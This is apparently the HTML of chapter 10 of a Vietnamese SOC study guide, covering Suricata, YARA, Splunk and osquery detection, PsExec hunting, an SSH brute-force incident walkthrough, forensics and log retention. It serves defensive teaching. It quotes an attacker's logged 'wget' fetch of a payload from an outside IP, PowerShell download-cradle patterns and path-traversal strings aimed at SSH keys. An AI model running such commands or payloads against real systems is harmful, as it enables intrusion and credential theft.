+<h3 id="ch10-1082-suricata-idsips-mo-xe-mot-rule">10.8.2. Suricata — IDS/IPS, mổ xẻ một rule</h3>
+<p><strong>Là gì:</strong> Suricata là engine IDS/IPS phân tích gói tin theo signature.</p>
+<p><strong>Cấu trúc rule:</strong></p>
+<pre><code>action proto src_ip src_port direction dst_ip dst_port (options)
+</code></pre>
+<p><strong>[DEMO]</strong> Ví dụ minh hoạ — phát hiện SSH brute-force bằng threshold (ngưỡng cần tune theo baseline trước khi dùng production):</p>
+<pre><code>alert tcp $EXTERNAL_NET any -&gt; $HOME_NET 22 (msg:&quot;SSH brute force attempt&quot;; \
+  flow:to_server,established; \
+  threshold:type threshold, track by_src, count 5, seconds 60; \
+  classtype:attempted-admin; sid:1000001; rev:1;)
+</code></pre>
+<p>Mổ xẻ từng phần:</p>
+<table>
+<thead>
+<tr>
+<th>Thành phần</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>action</td>
+<td>Hành động khi khớp</td>
+<td><code>alert</code> (chỉ cảnh báo), <code>drop</code> (IPS)</td>
+</tr>
+<tr>
+<td>proto</td>
+<td>Giao thức</td>
+<td><code>tcp</code></td>
+</tr>
+<tr>
+<td>src_ip / src_port</td>
+<td>Nguồn</td>
+<td><code>$EXTERNAL_NET any</code></td>
+</tr>
+<tr>
+<td>direction</td>
+<td>Chiều</td>
+<td><code>-&gt;</code> (một chiều)</td>
+</tr>
+<tr>
+<td>dst_ip / dst_port</td>
+<td>Đích</td>
+<td><code>$HOME_NET 22</code></td>
+</tr>
+<tr>
+<td>msg</td>
+<td>Mô tả trong alert</td>
+<td><code>"SSH brute force attempt"</code></td>
+</tr>
+<tr>
+<td>flow</td>
+<td>Trạng thái kết nối</td>
+<td><code>to_server,established</code></td>
+</tr>
+<tr>
+<td>threshold</td>
+<td>Ngưỡng tần suất</td>
+<td>5 lần / 60s / theo src</td>
+</tr>
+<tr>
+<td>classtype</td>
+<td>Phân loại</td>
+<td><code>attempted-admin</code></td>
+</tr>
+<tr>
+<td>sid</td>
+<td>Signature ID (≥1000000 cho rule tự định nghĩa)</td>
+<td><code>1000001</code></td>
+</tr>
+<tr>
+<td>rev</td>
+<td>Phiên bản rule</td>
+<td><code>1</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Chạy thử offline trên file pcap:</strong></p>
+<pre><code class="language-bash">suricata -r capture.pcap -S local.rules -l ./output/
+cat ./output/fast.log
+</code></pre>
+<p>Output mẫu <code>fast.log</code>:</p>
+<pre><code>06/19/2026-08:21:09.003456 [**] [1:1000001:1] SSH brute force attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 203.0.113.45:51022 -&gt; 10.0.0.5:22
+</code></pre>
+<p><strong>Lưu ý bảo mật:</strong> <code>alert</code> chỉ phát hiện; để chặn cần chế độ IPS (<code>drop</code>) và Suricata phải inline (NFQUEUE/AF_PACKET). <code>threshold</code> quá nhạy gây FP, quá cao bỏ sót — phải tune theo baseline.</p>
+<h3 id="ch10-1083-yara-phan-loai-filemalware-theo-pattern">10.8.3. YARA — phân loại file/malware theo pattern</h3>
+<p><strong>Là gì:</strong> YARA mô tả pattern (chuỗi, byte, regex) để nhận diện malware family.</p>
+<pre><code class="language-yara">rule Suspicious_PowerShell_Downloader
+{
+    meta:
+        author = &quot;soc-team&quot;
+        description = &quot;Encoded PowerShell download cradle&quot;
+        date = &quot;2026-06-19&quot;
+    strings:
+        $a = &quot;powershell&quot; nocase
+        $b = &quot;-EncodedCommand&quot; nocase
+        $c = &quot;DownloadString&quot; nocase
+        $hex = { 49 45 58 20 28 4E 65 77 }   // &quot;IEX (New&quot;
+    condition:
+        $a and ($b or $c or $hex)
+}
+</code></pre>
+<p>Giải thích: <code>strings</code> định nghĩa pattern (<code>nocase</code> không phân biệt hoa thường; <code>$hex</code> là chuỗi byte chính xác — <code>49 45 58</code> = ASCII "IEX"); <code>condition</code> là logic kết hợp.</p>
+<p><strong>Quét thực tế:</strong></p>
+<pre><code class="language-bash">yara -r downloader.yar /home/user/Downloads/
+# Output: Suspicious_PowerShell_Downloader /home/user/Downloads/invoice.ps1
+</code></pre>
+<p><strong>Lưu ý bảo mật:</strong> pattern quá chung (chỉ <code>$a</code> "powershell") gây FP hàng loạt; nên kết hợp nhiều điều kiện và byte-pattern đặc trưng.</p>
+<h3 id="ch10-1084-splunk-spl-truy-van-đieu-tra">10.8.4. Splunk SPL — truy vấn điều tra</h3>
+<p><strong>[DEMO]</strong> Ví dụ phát hiện brute-force-rồi-success (kịch bản mục 10.10):</p>
+<pre><code class="language-spl">index=wineventlog (EventCode=4625 OR EventCode=4624)
+| transaction IpAddress maxspan=10m
+| where eventcount &gt; 20 AND searchmatch(&quot;EventCode=4624&quot;)
+| table _time IpAddress TargetUserName eventcount
+</code></pre>
+<p>Giải thích tham số: <code>transaction</code> gom các event cùng <code>IpAddress</code> trong <code>maxspan=10m</code>; <code>eventcount</code> là số event trong transaction; điều kiện lọc giao dịch vừa có nhiều fail vừa có ít nhất 1 success.</p>
+<blockquote>
+<p><strong>Lưu ý hiệu năng:</strong> lệnh SPL <code>transaction</code> tốn tài nguyên trên dữ liệu lớn (giữ trạng thái từng nhóm sự kiện trong bộ nhớ); <strong>[PROD]</strong> production nên dùng <code>stats</code> gom theo field thay cho <code>transaction</code>:</p>
+<p><code>spl
+index=wineventlog (EventCode=4625 OR EventCode=4624)
+| stats count(eval(EventCode=4625)) as failed, count(eval(EventCode=4624)) as success,
+        min(_time) as first_seen, max(_time) as last_seen,
+        values(TargetUserName) as users by IpAddress
+| where failed &gt; 20 AND success &gt; 0</code></p>
+</blockquote>
+<h3 id="ch10-1085-velociraptor-osquery-truy-van-endpoint-phuc-vu-hunt">10.8.5. Velociraptor / osquery — truy vấn endpoint phục vụ hunt</h3>
+<p><strong>osquery</strong> cho phép truy vấn trạng thái endpoint bằng SQL. Ví dụ tìm process lắng nghe cổng lạ:</p>
+<pre><code class="language-sql">SELECT p.name, p.pid, l.port, l.address
+FROM listening_ports l
+JOIN processes p ON l.pid = p.pid
+WHERE l.port NOT IN (22, 80, 443, 3389);
+</code></pre>
+<p>Tìm scheduled task/cron persistence (Linux):</p>
+<pre><code class="language-sql">SELECT * FROM crontab WHERE command LIKE '%curl%' OR command LIKE '%wget%';
+</code></pre>
+<h3 id="ch10-1086-the-hive-soar-quan-ly-case-tu-đong-hoa">10.8.6. The Hive / SOAR — quản lý case &amp; tự động hoá</h3>
+<p><strong>Là gì:</strong> TheHive là nền tảng quản lý case IR; Cortex chạy "analyzers" (vd VirusTotal lookup hash). SOAR (Security Orchestration, Automation and Response) chạy playbook tự động.</p>
+<p>Ví dụ logic playbook SOAR (giả mã) cho phishing:</p>
+<pre><code>on alert &quot;phishing&quot;:
+  observables = extract(email)         # sender, url, hash
+  for each url in observables.urls:
+     vt = VirusTotal.lookup(url)
+     if vt.malicious &gt;= 3:
+         MailGateway.block(url)
+         create_case(severity=&quot;high&quot;)
+         M365.purge(subject=email.subject)
+  notify_slack(&quot;#soc&quot;, summary)
+</code></pre>
+<p><strong>Lưu ý bảo mật:</strong> tự động hoá hành động có sức phá hoại (block/purge/isolate) phải có rào chắn: chỉ auto-thực thi với confidence cao; hành động rủi ro cao cần human-in-the-loop để tránh kẻ tấn công lợi dụng SOAR gây DoS (vd cố tình trigger để auto-block dải IP hợp pháp).</p>
+<hr />
+<h2 id="ch10-109-threat-hunting-gia-thuyet-dua-tren-mitre-attck">10.9. Threat Hunting — giả thuyết dựa trên MITRE ATT&amp;CK</h2>
+<h3 id="ch10-1091-nguyen-ly">10.9.1. Nguyên lý</h3>
+<p>Hunting là <strong>chủ động</strong> đi tìm dấu vết kẻ tấn công mà detection tự động CHƯA bắt được. Khác với triage (phản ứng với alert), hunting bắt đầu từ một <strong>giả thuyết</strong> (hypothesis) thường dựa trên một kỹ thuật trong <strong>MITRE ATT&amp;CK</strong> (ma trận Tactics × Techniques, mỗi technique có mã Txxxx).</p>
+<p>Vòng lặp hunt:</p>
+<pre><code>1. Hypothesis  -&gt; &quot;Kẻ tấn công có thể đang lateral movement bằng PsExec (T1021.002 / T1570)&quot;
+2. Data        -&gt; Xác định nguồn dữ liệu cần: Event 7045 (service install), 4624 LogonType 3,
+                  network SMB 445, process create (4688) named psexesvc.
+3. Hunt/Query  -&gt; Chạy query tìm dấu hiệu.
+4. Triage      -&gt; Phát hiện gì? phân tích.
+5. Outcome     -&gt; Nếu tìm thấy -&gt; incident. Nếu không -&gt; tạo detection mới để tự động hoá hunt.
+</code></pre>
+<h3 id="ch10-1092-vi-du-hunt-cu-the-lateral-movement-qua-psexec">10.9.2. Ví dụ hunt cụ thể — Lateral Movement qua PsExec</h3>
+<p><strong>Giả thuyết:</strong> "Một host nội bộ đang dùng PsExec để chạy lệnh từ xa trên host khác."</p>
+<p><strong>Dấu hiệu byte/event đặc trưng của PsExec:</strong>
+- PsExec tạo một <strong>service tên <code>PSEXESVC</code></strong> trên máy đích → <strong>Event 7045</strong> với <code>Service Name = PSEXESVC</code> và đường dẫn binary <code>%SystemRoot%\PSEXESVC.exe</code>.
+- Logon kiểu <strong>Network (LogonType 3)</strong> từ host nguồn (Event 4624) ngay trước đó.
+- Kết nối <strong>SMB cổng 445</strong> từ nguồn tới đích; ghi file qua <strong>ADMIN$ share</strong>.
+- Named pipe <code>\PSEXESVC</code> được tạo.</p>
+<p><strong>Query Splunk:</strong></p>
+<pre><code class="language-spl">index=wineventlog EventCode=7045 Service_Name=&quot;PSEXESVC&quot;
+| stats count by Computer, _time
+| sort _time
+</code></pre>
+<p>Tương quan với logon network:</p>
+<pre><code class="language-spl">index=wineventlog EventCode=4624 Logon_Type=3
+| join Computer
+  [ search index=wineventlog EventCode=7045 Service_Name=&quot;PSEXESVC&quot; ]
+| table _time, Computer, IpAddress, TargetUserName
+</code></pre>
+<p><strong>Tinh ý:</strong> kẻ tấn công có thể đổi tên service (PsExec hỗ trợ <code>-r</code>); hunt nâng cao tìm <strong>mẫu hành vi</strong> (service mới tạo + binary trong đường dẫn lạ + chạy ngay 1 lần rồi gỡ) chứ không chỉ tên <code>PSEXESVC</code>.</p>
+<p><strong>Ánh xạ MITRE:</strong> T1021.002 (SMB/Windows Admin Shares), T1570 (Lateral Tool Transfer), T1569.002 (Service Execution).</p>
+<h3 id="ch10-1093-mo-hinh-pyramid-of-pain">10.9.3. Mô hình "Pyramid of Pain"</h3>
+<p>Khi tạo IOC/detection, ưu tiên các chỉ dấu khó né tránh:</p>
+<pre><code>            ▲ Khó cho attacker đổi (giá trị cao)
+   TTPs               &lt;- Khó nhất, nên săn
+   Tools
+   Network/Host Artifacts
+   Domain Names
+   IP Addresses
+   Hash Values        &lt;- Dễ đổi nhất (giá trị thấp)
+            ▼
+</code></pre>
+<p><strong>Vì sao:</strong> hash thay đổi chỉ bằng cách thêm 1 byte; nhưng hành vi (TTP) phản ánh cách kẻ tấn công vận hành, đổi rất tốn kém. Hunt theo TTP/hành vi bền hơn hunt theo IOC tĩnh.</p>
+<hr />
+<h2 id="ch10-1010-tinh-huong-mau-phan-tich-tu-đau-đen-cuoi">10.10. Tình huống mẫu — phân tích từ đầu đến cuối</h2>
+<p>Kịch bản: <strong>nhiều login fail rồi một login success</strong> trên một máy chủ Linux có SSH mở Internet (<code>auth-srv-01</code>, IP nội bộ <code>10.0.0.5</code>).</p>
+<h3 id="ch10-buoc-0-raw-log-tho-varlogauthlog">Bước 0 — Raw log thô (<code>/var/log/auth.log</code>)</h3>
+<pre><code>Jun 19 08:20:31 auth-srv-01 sshd[4801]: Failed password for invalid user admin from 203.0.113.45 port 50991 ssh2
+Jun 19 08:20:33 auth-srv-01 sshd[4805]: Failed password for invalid user root from 203.0.113.45 port 50995 ssh2
+Jun 19 08:20:35 auth-srv-01 sshd[4809]: Failed password for invalid user oracle from 203.0.113.45 port 51001 ssh2
+... (hàng trăm dòng tương tự, ~3 lần/giây) ...
+Jun 19 08:24:58 auth-srv-01 sshd[5102]: Failed password for deploy from 203.0.113.45 port 52210 ssh2
+Jun 19 08:25:01 auth-srv-01 sshd[5108]: Accepted password for deploy from 203.0.113.45 port 52240 ssh2
+Jun 19 08:25:01 auth-srv-01 sshd[5108]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 19 08:25:44 auth-srv-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh
+</code></pre>
+<h3 id="ch10-buoc-1-detection">Bước 1 — Detection</h3>
+<p>Sigma/Suricata threshold (mục 10.8) phát ra alert "SSH brute force from 203.0.113.45". Tier 1 nhận alert.</p>
+<h3 id="ch10-buoc-2-triage-tier-1">Bước 2 — Triage (Tier 1)</h3>
+<ul>
+<li><strong>Xác minh:</strong> đọc raw log, xác nhận ~400 fail trong ~4.5 phút từ 1 src → TP, không phải FP/scanner đã biết.</li>
+<li><strong>Điểm chuyển nghiêm trọng:</strong> dòng <code>Accepted password for deploy</code> → <strong>đã có success</strong>. Nâng severity từ "brute-force attempt" lên "credential compromise". Escalate Tier 2 NGAY.</li>
+</ul>
+<p>Truy vấn đếm:</p>
+<pre><code class="language-bash">grep &quot;Failed password&quot; /var/log/auth.log | grep &quot;203.0.113.45&quot; | wc -l
+# 412
+grep &quot;Accepted password&quot; /var/log/auth.log | grep &quot;203.0.113.45&quot;
+# Jun 19 08:25:01 ... Accepted password for deploy from 203.0.113.45 ...
+</code></pre>
+<h3 id="ch10-buoc-3-analysis-tier-2">Bước 3 — Analysis (Tier 2)</h3>
+<ul>
+<li><strong>Timeline:</strong> 08:20:31 bắt đầu spray → 08:25:01 success user <code>deploy</code> → 08:25:44 chạy <code>sudo wget http://203.0.113.45/x.sh</code> (tải payload, nghi second-stage).</li>
+<li><strong>Scope:</strong> user <code>deploy</code> đã chạy sudo → có thể đã thành root. Phải coi như <strong>toàn host bị xâm nhập</strong>.</li>
+<li><strong>IOC trích xuất:</strong> IP <code>203.0.113.45</code>, user mục tiêu <code>deploy</code>, URL payload <code>http://203.0.113.45/x.sh</code>.</li>
+</ul>
+<h3 id="ch10-buoc-4-containment-short-term">Bước 4 — Containment (short-term)</h3>
+<pre><code class="language-bash"># Cô lập host khỏi mạng nhưng GIỮ máy chạy (bảo toàn RAM)
+sudo iptables -I INPUT 1 -s 203.0.113.45 -j DROP
+sudo iptables -I OUTPUT 1 -d 203.0.113.45 -j DROP
+# Hoặc cô lập toàn bộ qua EDR network-isolate. Thu thập trước khi cắt hẳn.
+</code></pre>
+<p>Thu thập volatile data trước eradication:</p>
+<pre><code class="language-bash">ss -tnp        # kết nối đang mở (tìm reverse shell tới 203.0.113.45)
+ps auxf        # cây tiến trình
+sudo lsof -p &lt;pid_nghi&gt;
+crontab -l; ls -la /etc/cron.*   # persistence
+last; w        # phiên đăng nhập
+</code></pre>
+<h3 id="ch10-buoc-5-forensics-chain-of-custody">Bước 5 — Forensics &amp; Chain of Custody</h3>
+<ul>
+<li>Chụp memory (vd <code>LiME</code>/<code>avml</code>) và disk image trước khi thay đổi.</li>
+<li>Tính hash bằng chứng và ghi chain of custody (mục 10.11).</li>
+</ul>
+<h3 id="ch10-buoc-6-eradication">Bước 6 — Eradication</h3>
+<ul>
+<li>Reset mật khẩu <code>deploy</code> + mọi tài khoản; vô hiệu hoá SSH password auth (chuyển key-only).</li>
+<li>Tìm &amp; xoá payload <code>x.sh</code>, backdoor, cron lạ, key SSH lạ trong <code>~/.ssh/authorized_keys</code>.</li>
+<li>Vì đã có quyền root khả nghi → <strong>rebuild host từ image sạch</strong> thay vì làm sạch tại chỗ.</li>
+</ul>
+<h3 id="ch10-buoc-7-recovery">Bước 7 — Recovery</h3>
+<ul>
+<li>Khôi phục dịch vụ trên host mới build; đặt SSH sau bastion/VPN; bật fail2ban + MFA; giám sát tăng cường 203.0.113.45 và hành vi của <code>deploy</code>.</li>
+</ul>
+<h3 id="ch10-buoc-8-lessons-learned">Bước 8 — Lessons Learned</h3>
+<ul>
+<li>Vì sao SSH password mở thẳng Internet? Vì sao <code>deploy</code> mật khẩu yếu, không MFA? → Áp chính sách key-only, MFA, rate-limit, đưa SSH ra khỏi Internet. Bổ sung detection "success ngay sau chuỗi fail" để rút ngắn MTTD.</li>
+</ul>
+<hr />
+<h2 id="ch10-1011-chain-of-custody-forensics-co-ban">10.11. Chain of Custody &amp; Forensics cơ bản</h2>
+<h3 id="ch10-10111-chain-of-custody-chuoi-luu-giu-bang-chung">10.11.1. Chain of Custody (chuỗi lưu giữ bằng chứng)</h3>
+<p><strong>Là gì:</strong> hồ sơ ghi lại ai đã giữ bằng chứng, khi nào, làm gì với nó — để bằng chứng có giá trị pháp lý (chứng minh không bị giả mạo).</p>
+<p>Mẫu biểu chain of custody — từng trường bắt buộc:</p>
+<table>
+<thead>
+<tr>
+<th>Trường</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Evidence ID</td>
+<td>Mã định danh duy nhất</td>
+<td>EV-2026-0619-001</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Mô tả vật chứng</td>
+<td>Disk image auth-srv-01, 500GB</td>
+</tr>
+<tr>
+<td>Collected by</td>
+<td>Người thu thập</td>
+<td>Analyst A</td>
+</tr>
+<tr>
+<td>Date/Time</td>
+<td>Thời điểm (kèm timezone)</td>
+<td>2026-06-19 09:10 UTC</td>
+</tr>
+<tr>
+<td>Hash (acquisition)</td>
+<td>Hash lúc thu thập</td>
+<td>SHA-256: a1b2...</td>
+</tr>
+<tr>
+<td>Method/Tool</td>
+<td>Công cụ + version</td>
+<td>dd / FTK Imager 4.7</td>
+</tr>
+<tr>
+<td>Custody log</td>
+<td>Chuỗi bàn giao (từ → đến, thời gian, lý do)</td>
+<td>A → B, 10:00, để phân tích</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch10-10112-nguyen-tac-order-of-volatility-rfc-3227">10.11.2. Nguyên tắc Order of Volatility (RFC 3227)</h3>
+<p>Thu thập theo thứ tự dễ mất trước → bền sau:</p>
+<pre><code>1. CPU registers, cache
+2. RAM (process, network state, mã không lưu đĩa)
+3. Network state (kết nối, ARP, bảng routing)
+4. Running processes
+5. Disk (file system)
+6. Remote logging / monitoring data
+7. Cấu hình vật lý, topology
+8. Phương tiện lưu trữ ngoài (backup, ...)
+</code></pre>
+<p><strong>Vì sao:</strong> RAM mất khi tắt nguồn; tắt máy ngay = mất reverse shell, mã chạy chỉ trong bộ nhớ, key giải mã. Đây là lý do trong playbook ransomware/brute-force ta <strong>không tắt máy</strong>, chỉ cô lập mạng.</p>
+<h3 id="ch10-10113-thu-thap-xac-minh-tinh-toan-ven">10.11.3. Thu thập &amp; xác minh tính toàn vẹn</h3>
+<pre><code class="language-bash"># Tạo disk image read-only và tính hash cùng lúc
+sudo dd if=/dev/sda bs=4M conv=noerror,sync status=progress | tee image.dd | sha256sum
+# Lưu hash
+sha256sum image.dd &gt; image.dd.sha256
+# Khi xác minh lại sau:
+sha256sum -c image.dd.sha256
+# image.dd: OK
+</code></pre>
+<p><strong>Vì sao dùng hash:</strong> SHA-256 (256-bit/32-byte digest) cho phép chứng minh image không đổi một bit nào kể từ lúc thu thập. Một bit đổi → hash đổi hoàn toàn (avalanche effect). Dùng <strong>write-blocker</strong> phần cứng để đảm bảo không ghi đè bằng chứng khi đọc.</p>
+<p><strong>Lưu ý bảo mật/pháp lý:</strong> vi phạm chain of custody (khoảng trống thời gian, không hash, dùng tool không tin cậy) làm bằng chứng mất giá trị tại toà. Forensics phải làm trên <strong>bản sao</strong> (image), không bao giờ trên ổ gốc.</p>
+<hr />
+<h2 id="ch10-1012-log-retention-chinh-sach-luu-tru-va-ly-do">10.12. Log Retention — chính sách lưu trữ và lý do</h2>
+<h3 id="ch10-10121-vi-sao-phai-luu-lau">10.12.1. Vì sao phải lưu lâu</h3>
+<ul>
+<li><strong>Dwell time:</strong> thời gian kẻ tấn công ẩn trong mạng trước khi bị phát hiện thường tính bằng tuần đến tháng (theo các báo cáo ngành như Mandiant M-Trends — con số cụ thể thay đổi theo năm, [cần kiểm chứng theo báo cáo mới nhất]). Nếu chỉ giữ log 30 ngày mà dwell time 90 ngày → không có log thời điểm xâm nhập ban đầu để điều tra.</li>
+<li><strong>Tuân thủ:</strong> nhiều khung yêu cầu thời hạn tối thiểu. Ví dụ phổ biến (cần đối chiếu phiên bản hiện hành):</li>
+<li>PCI DSS: tối thiểu 1 năm log, trong đó ≥ 3 tháng truy cập ngay (immediately available) — [đối chiếu PCI DSS bản hiện hành].</li>
+<li>Nhiều quy định tài chính/y tế yêu cầu nhiều năm.</li>
+</ul>
+<h3 id="ch10-10122-mo-hinh-luu-tru-phan-tang-hotwarmcold">10.12.2. Mô hình lưu trữ phân tầng (hot/warm/cold)</h3>
+<table>
+<thead>
+<tr>
+<th>Tầng</th>
+<th>Thời gian</th>
+<th>Đặc điểm</th>
+<th>Mục đích</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hot</td>
+<td>0–30 ngày</td>
+<td>Index đầy đủ, truy vấn nhanh, đắt</td>
+<td>Detection &amp; điều tra hiện hành</td>
+</tr>
+<tr>
+<td>Warm</td>
+<td>30–90 ngày</td>
+<td>Index một phần, chậm hơn</td>
+<td>Điều tra sự cố gần</td>
+</tr>
+<tr>
+<td>Cold/Archive</td>
+<td>90 ngày–nhiều năm</td>
+<td>Nén, lưu rẻ (object storage), khôi phục chậm</td>
+<td>Tuân thủ, điều tra cũ, pháp lý</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Vì sao phân tầng:</strong> index nóng tốn CPU/RAM/đĩa; giữ tất cả ở hot rất đắt. Phân tầng cân bằng chi phí với khả năng truy cập.</p>
+<h3 id="ch10-10123-bao-ve-tinh-toan-ven-cua-log">10.12.3. Bảo vệ tính toàn vẹn của log</h3>
+<ul>
+<li><strong>Write-once / WORM</strong> hoặc append-only để chống sửa/xoá log (kẻ tấn công luôn cố xoá log — Event 1102 là dấu hiệu).</li>
+<li><strong>Forward log realtime</strong> khỏi host (về SIEM) để nếu host bị chiếm thì log vẫn còn ở nơi khác.</li>
+<li><strong>Time sync (NTP)</strong> trên toàn hạ tầng — không có thời gian thống nhất thì không dựng được timeline tương quan đa nguồn.</li>
+</ul>
+<p><strong>Lưu ý bảo mật:</strong> retention không chỉ là "giữ bao lâu" mà còn là "ai đọc được" — log chứa dữ liệu nhạy cảm (username, IP, đôi khi credential bị lộ). Kiểm soát truy cập kho log và mã hoá at-rest là bắt buộc.</p>
+<hr />
+<h2 id="ch10-1013-tong-ket-ket-noi-cac-manh">10.13. Tổng kết kết nối các mảnh</h2>
+<p>Vận hành SOC là một vòng khép kín:</p>
+<ul>
+<li><strong>Vòng vận hành:</strong> chuẩn bị (logging, playbook, công cụ) → phát hiện (rule trên log chuẩn hoá) → triage (Tier 1) → điều tra (Tier 2) → ứng phó (containment/eradication/recovery, bảo toàn bằng chứng) → bài học → cải tiến detection.</li>
+<li><strong>Phản hồi từ hunting:</strong> Threat hunting (Tier 3) bơm các phát hiện mới ngược trở lại làm giàu detection tự động.</li>
+<li><strong>Nền tảng chung của mọi bước:</strong></li>
+<li><strong>Đọc đúng log tới từng trường</strong> — syslog PRI, Event ID/LogonType/Status, CEF extension.</li>
+<li><strong>Đo lường đúng</strong> — MTTD/MTTR có định nghĩa rõ.</li>
+<li><strong>Xử lý bằng chứng đúng chuẩn</strong> — order of volatility, chain of custody, hash toàn vẹn.</li>
+</ul>
+<p>Điểm mấu chốt khép lại chương:</p>
+<ul>
+<li><strong>Nắm chắc chi tiết byte/field/bước</strong> là điều kiện tiên quyết của vận hành chắc tay.</li>
+<li>Bỏ qua chúng là để lại điểm mù — và kẻ tấn công khai thác đúng những điểm mù đó trong vận hành.</li>
+</ul>
+<hr />
+<h2 id="ch10-ghi-chu-cua-minh">Ghi chú của mình</h2>
+<blockquote>
+<p><em>Khu vực ghi chú cá nhân: những điểm từng hiểu sai, phần còn đang tìm hiểu, hoặc kinh nghiệm rút ra khi thực hành — cập nhật dần.</em></p>
+</blockquote>
+<ul>
+<li><strong>Điều tra alert thật, không tin bản tóm tắt của SIEM.</strong> Ở hệ thống mình vận hành (stack Wazuh + OpenSearch) từng có một IP VPS công cộng bơm mấy trăm request trong hơn 2 giờ để quét path traversal — kiểu <code>%252e%252e</code> (double-encoding), <code>....//</code>, nhắm vào <code>.ssh/id_rsa</code>, <code>.env</code>, <code>.mysql_history</code>, lại còn xoay user-agent và giả referer Bing cho giống traffic thật. Lúc đầu nhìn cảnh báo thấy đáng sợ, nhưng khi mở raw event ra soi (aggregate theo <code>data.url</code>, <code>rule.id</code>, dựng date_histogram, đọc <code>full_log</code> để lấy dòng log gốc vì access.log trên máy đã xoay) thì thấy toàn <code>301/400/404</code> — không có event "tấn công trả 200" nào. Kết luận: bị quét dữ dội nhưng <strong>chưa thủng</strong>. Bài học mình rút ra đúng như mục 10.4: severity thật nằm ở <em>kết quả</em> (có response 2xx bất thường không), không phải ở <em>số lượng</em> request.</li>
+<li><strong>Chặn IP là "đập chuột chũi".</strong> Sau vụ trên mình thử chặn IP thì hôm sau hàng chục IP/subnet khác lại quét cả fleet. Từ đó mình nghiêng hẳn sang hardening theo <em>hành vi</em> (rate-limit, giới hạn truy cập theo nguồn, chặn tên tệp nhạy cảm ở lớp proxy) thay vì đuổi theo từng IP.</li>
+<li><strong>SOAR để giảm nhiễu, không phải để thay người.</strong> Mình đang dựng một luồng nối SIEM → SOAR: lọc IP public trong alert rồi enrich qua vài nguồn threat intel (điểm tin cậy kiểu AbuseIPDB + số engine gắn cờ kiểu VirusTotal) trước khi báo về kênh vận hành. Giá trị lớn nhất không phải "tự động chặn" mà là <strong>phân biệt nguồn có tiền sử tấn công với truy cập hợp lệ bị log nhầm</strong> — nhờ vậy số alert cần người xử lý giảm rõ. Đúng tinh thần mục 10.8.6: hành động phá hoại (block/purge) mình vẫn để human-in-the-loop, chỉ auto phần enrich/gắn nhãn.</li>
+<li><strong>Đang tìm hiểu tiếp:</strong> nối ngưỡng tự chặn (kiểu fail2ban ↔ SIEM) sao cho không tự bắn vào chân khi một IP hợp lệ vô tình vượt ngưỡng.</li>
+</ul>
+</section>
+      <nav class="pager"><a class="pg prev" href="ch09.html"><span>← Chương trước</span><b>09 · Observability &amp; Giám sát hạ tầng</b></a><a class="pg next" href="ch11.html"><span>Chương sau →</span><b>11 · Phòng thủ mạng (IDS/WAF/VPN)</b></a></nav>
+    </main>
+    <footer class="site-foot">
+      <p>Ghi chép & chia sẻ bởi <span class="name">Fee</span> · tự do cho mục đích học tập.
+      &nbsp;·&nbsp; <a href="https://github.com/fee-191" target="_blank" rel="noopener">GitHub</a>
+      &nbsp;·&nbsp; <a href="https://linkedin.com/in/leduongphi191" target="_blank" rel="noopener">LinkedIn</a></p>
+      <p>Nội dung mang tính giáo dục, nhằm mục đích phòng thủ. Hãy thực hành hợp pháp, chỉ trên hệ thống bạn được phép.</p>
+    </footer>
+  </div>
+</div>
+<script>
+const root=document.documentElement;
+const THEMES=['light','dark','wibu'];
+const ICON={light:'☀️',dark:'🌙',wibu:'🌸'};
+function curTheme(){return root.getAttribute('data-theme')||'light';}
+function syncTheme(){const c=curTheme();document.querySelectorAll('.themeBtn').forEach(b=>b.textContent=ICON[c]||'☀️');}
+function setTheme(t){if(t==='light')root.removeAttribute('data-theme');else root.setAttribute('data-theme',t);localStorage.setItem('kb-theme',t);syncTheme();}
+syncTheme();
+document.querySelectorAll('.themeBtn').forEach(b=>b.addEventListener('click',()=>{
+  const i=THEMES.indexOf(curTheme());setTheme(THEMES[(i+1)%THEMES.length]);
+}));
+const navChapters=[...document.querySelectorAll('.nav-chapter')];
+document.querySelectorAll('.nav-sub, .nav-ch-title').forEach(a=>a.addEventListener('click',()=>{if(window.innerWidth<=980)document.querySelector('.sidebar').classList.remove('show');}));
+// Đánh dấu mục con đang đọc trong chương hiện tại
+const cur=document.querySelector('.nav-chapter.active');
+if(cur){
+  const heads=[...document.querySelectorAll('.chapter h2[id]')];
+  const links=new Map([...cur.querySelectorAll('.nav-sub')].map(a=>[a.getAttribute('href').slice(1),a]));
+  const obs=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){
+    links.forEach(a=>a.classList.remove('here'));
+    const a=links.get(e.target.id); if(a){a.classList.add('here');a.scrollIntoView({block:'nearest'});}
+  }});},{rootMargin:'-10% 0px -80% 0px',threshold:0});
+  heads.forEach(h=>obs.observe(h));
+}
+const box=document.getElementById('q');
+if(box)box.addEventListener('input',()=>{const q=box.value.trim().toLowerCase();
+  navChapters.forEach(c=>{const title=c.querySelector('.nav-ch-title').innerText.toLowerCase();
+    const subs=[...c.querySelectorAll('.nav-sub')];let any=title.includes(q);
+    subs.forEach(s=>{const m=s.innerText.toLowerCase().includes(q);s.style.display=(!q||m)?'block':'none';if(m)any=true;});
+    c.style.display=(!q||any)?'block':'none';});
+});
+const mb=document.getElementById('menu');if(mb)mb.addEventListener('click',()=>document.querySelector('.sidebar').classList.toggle('show'));
+// ←/→ chuyển chương
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='INPUT'||e.metaKey||e.ctrlKey||e.altKey)return;
+  const p=document.querySelector('link[rel=prev]'),n=document.querySelector('link[rel=next]');
+  if(e.key==='ArrowLeft'&&p)location.href=p.href;
+  if(e.key==='ArrowRight'&&n)location.href=n.href;
+});
+</script>
+</body>
+</html>
